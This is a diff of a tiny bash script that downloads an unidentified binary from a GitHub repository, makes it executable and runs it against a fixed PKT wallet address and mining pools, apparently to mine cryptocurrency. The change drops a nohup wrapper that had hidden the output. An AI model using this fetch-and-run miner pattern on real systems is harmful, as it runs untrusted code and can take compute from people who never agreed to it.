@@ -1,4 +1,4 @@
 #!/bin/bash
 wget https://github.com/kiposnakursi/a/raw/main/kipli
 chmod +x kipli
-nohup ./kipli ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io > nohup.out >/dev/null 2>&1 
+./kipli ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io
